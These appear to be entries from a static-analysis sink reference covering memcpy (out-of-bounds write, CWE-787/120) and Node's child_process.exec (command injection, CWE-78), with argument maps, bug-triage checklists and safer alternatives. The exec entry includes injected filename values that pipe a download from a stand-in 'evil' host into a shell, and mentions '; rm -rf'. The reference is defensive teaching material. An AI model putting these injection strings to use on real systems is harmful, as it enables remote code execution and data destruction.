memcpy

Copies a caller-chosen number of bytes into the destination buffer. If that byte count is attacker-influenced and the destination is a fixed-size buffer, the write runs past the end of it — a classic buffer overflow.

Argument map · what each slot does
void *memcpy(void *dest, const void *src, size_t n)
ArgAccess pathPurposeWatched
destArgument[0]Destination buffer the bytes are written into.— no
srcArgument[1]Source the bytes are read from.— no
nArgument[2]Number of bytes copied — the overflow lever. If n exceeds the real size of dest, the write spills past it.▲ sink

Only the size argument carries the fact. The pointers aren't flagged — the danger is the count, not the buffers.

The weakness
CWE-787 ↗
Out-of-bounds Write

The product writes data past the end, or before the beginning, of the intended buffer — corrupting adjacent memory.

CWE-120 ↗
Classic Buffer Overflow

Copies an input buffer to an output buffer without verifying the input is smaller than the destination.

What goes wrong
Attacker's-eye view

If the attacker controls n, they pass a length larger than dest. The copy overruns the buffer and overwrites whatever sits after it — a saved return address, a function pointer, heap metadata — turning a copy into memory corruption or code execution.

// dest is a 64-byte stack buffer char dest[64]; // n comes from a length field in a network packet memcpy(dest, packet.body, packet.len); // len = 4096 → 4KB written into 64 bytes
To decide if this call is a bug, check
1Does n derive from untrusted input — a network read, a file, argv, an env var?
2Is dest a fixed-size or smaller-than-n allocation?
3Is there a bounds check — n <= sizeof(dest) — that dominates this call on every path?
If 1 and 2 hold and 3 is missing on any path, this is a probable out-of-bounds write. Steps 1 and 3 are reachability/guard questions a lookup can't answer — that's the handoff below.
Is this a bug in your code?Atropos stops here — by design

Atropos tells you Argument[2] is a buffer-size sink. It does not tell you whether untrusted data reaches n here, or whether a bound already guards it.

Those are reachability questions about your codebase — steps 1 and 3 above. Lachesis traces the flow and the dominating guards.

child_process.exec

javascript · node:child_process · arity 3
sink✓ Human-reviewed · 2026-09-04
RoleSink
WeaknessCWE-78
WatchesArgument[0] · command
Kindcommand-injection
Confidencehigh
Sanitizershell-quote

Runs a command string through the host shell. Any attacker-controlled substring in that string can break out and become its own shell command — ; rm -rf, a backtick, a pipe.

Argument map · what each slot does
child_process.exec(command, options?, callback?)
ArgAccess pathPurposeWatched
commandArgument[0]Full command line, passed to /bin/sh -c. Shell metacharacters in it are interpreted, not escaped.▲ sink
optionsArgument[1]cwd, env, timeout, shell selection.— no
callbackArgument[2]Receives (error, stdout, stderr).— no
The weakness
CWE-78 ↗
OS Command Injection

The product builds an OS command from external input without neutralizing special elements, so the input can alter the command that runs.

What goes wrong
Attacker's-eye view

Any attacker-controlled substring of command can inject its own command with the app's privileges — a semicolon, a pipe, or a backtick ends the intended command and starts theirs.

// filename is user-supplied exec(`convert ${filename} out.png`) // filename = "x.png; curl evil.sh | sh" // → convert runs, then the injected download runs too
To decide if this call is a bug, check
1Does any part of command come from untrusted input?
2Is the string built by concatenation or a template rather than a fixed literal?
3Is the untrusted part passed through a shell escape (shell-quote) — or better, an argument-array API?
If 1 and 2 hold and 3 is absent, this is a probable command injection. The safer shape is below; reachability of step 1 is the handoff.

Reviewed guidance

Human-checked overlay · applies to node:child_process · reviewed 2026-09-04
Safer direction

Prefer an argument-array API with a fixed executable and no shell: execFile('convert', [filename, 'out.png'], {shell:false}). The arguments never touch a shell, so metacharacters stay inert.

Unsafe shape
// filename is user input exec(`convert ${filename} out.png`) // filename = "x; curl evil|sh" // → runs the injected command
Safer shape
execFile( 'convert', [filename, 'out.png'], { shell: false } ) // filename is one arg
